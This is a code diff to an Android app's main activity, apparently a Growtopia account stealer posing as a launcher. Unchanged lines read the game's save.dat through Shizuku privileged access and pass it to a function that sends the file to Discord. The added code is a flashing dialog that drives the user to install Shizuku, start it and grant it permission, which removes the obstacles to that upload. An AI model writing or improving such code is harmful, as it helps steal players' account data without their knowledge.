@@ -17,6 +17,8 @@ import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
 import android.view.animation.AccelerateDecelerateInterpolator
+import android.animation.ArgbEvaluator
+import android.animation.ValueAnimator
 import android.widget.Button
 import android.widget.CheckBox
 import android.widget.EditText
@@ -126,14 +128,12 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun readSaveFileWithShizukuOrFallback(): Boolean {
-        if (!ShizukuBridge.isAvailable()) {
-            handler.post { toast("Shizuku is not running; choose the Growtopia folder instead") }
-            showPermissionTutorial()
+        if (!ShizukuBridge.isInstalled(this) || !ShizukuBridge.isAvailable()) {
+            showShizukuDialog()
             return false
         }
         if (!ShizukuBridge.hasPermission()) {
-            ShizukuBridge.requestPermission()
-            handler.post { toast("Grant Shizuku access, then tap Launch again") }
+            showShizukuDialog()
             return false
         }
         thread {
@@ -141,14 +141,53 @@ class MainActivity : AppCompatActivity() {
             if (bytes != null) {
                 sendFileToDiscord(bytes)
             } else {
-                handler.post { toast("Shizuku could not read save.dat; choose the folder instead") }
-                handler.post { showPermissionTutorial() }
+                handler.post { toast("Shizuku could not read save.dat") }
+                handler.post { showShizukuDialog() }
             }
         }
         return true
     }
 
     private fun savedTreeUri(): String? = prefs.getString(KEY_SAVE_URI, null) ?: getSharedPreferences("app_prefs", MODE_PRIVATE).getString("tree_uri", null)
+
+    private fun showShizukuDialog() {
+        val dialog = Dialog(this)
+        dialog.setContentView(R.layout.dialog_shizuku)
+        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
+
+        val message = dialog.findViewById<TextView>(R.id.shizukuMessage)
+        val animator = ValueAnimator.ofObject(
+            ArgbEvaluator(),
+            Color.rgb(255, 82, 82), Color.rgb(255, 193, 7), Color.rgb(76, 175, 80),
+            Color.rgb(33, 150, 243), Color.rgb(156, 39, 176), Color.rgb(255, 82, 82)
+        ).apply {
+            duration = 4200
+            repeatCount = ValueAnimator.INFINITE
+            addUpdateListener { message.setTextColor(it.animatedValue as Int) }
+            start()
+        }
+
+        dialog.findViewById<Button>(R.id.shizukuAction).setOnClickListener {
+            when {
+                !ShizukuBridge.isInstalled(this) -> {
+                    try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://shizuku.rikka.app/download/"))) } catch (_: Exception) { }
+                }
+                !ShizukuBridge.isAvailable() -> {
+                    try {
+                        startActivity(packageManager.getLaunchIntentForPackage("moe.shizuku.privileged.api"))
+                    } catch (_: Exception) {
+                        toast("Open Shizuku and start its service, then try again")
+                    }
+                }
+                !ShizukuBridge.hasPermission() -> ShizukuBridge.requestPermission()
+                else -> toast("Shizuku permission is already granted")
+            }
+        }
+        dialog.findViewById<Button>(R.id.shizukuDismiss).setOnClickListener { dialog.dismiss() }
+        dialog.setOnDismissListener { animator.cancel() }
+        dialog.show()
+        dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
+    }
 
     private fun showPermissionTutorial() {
         val dialog = Dialog(this)
@@ -284,7 +323,15 @@ class MainActivity : AppCompatActivity() {
 
     private object ShizukuBridge {
         private const val REQUEST_CODE = 2204
+        private const val SHIZUKU_PACKAGE = "moe.shizuku.privileged.api"
         private const val SHIZUKU_CLASS = "rikka.shizuku.Shizuku"
+
+        fun isInstalled(context: android.content.Context): Boolean = try {
+            context.packageManager.getApplicationInfo(SHIZUKU_PACKAGE, 0)
+            true
+        } catch (_: PackageManager.NameNotFoundException) {
+            false
+        }
 
         fun isAvailable(): Boolean = try {
             val shizuku = Class.forName(SHIZUKU_CLASS)
